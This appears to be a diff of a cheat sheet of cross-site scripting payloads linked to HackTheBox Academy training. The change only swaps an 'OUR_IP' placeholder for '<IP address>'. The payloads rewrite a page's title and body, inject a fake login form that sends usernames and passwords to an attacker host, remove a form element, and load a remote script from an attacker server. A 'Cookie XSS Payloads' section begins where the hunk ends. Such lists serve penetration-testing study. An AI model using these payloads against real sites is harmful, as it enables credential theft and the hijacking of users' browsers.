@@ -479,15 +479,15 @@ CTRL + U
 <script>document.title = 'HackTheBox Academy'</script>
 <script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Old Milks</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="Fattest Milks"> </p></center>'</script>
-<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
+<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
 <script>document.getElementById('urlform').remove();</script>
-<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
+<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
 ```
 
 - Remote Script XSS Payloads
 
 ```
-<script src="http://OUR_IP/script.js"></script>	
+<script src="http://<IP address>/script.js"></script>	
 ```
 
 - Cookie XSS Payloads
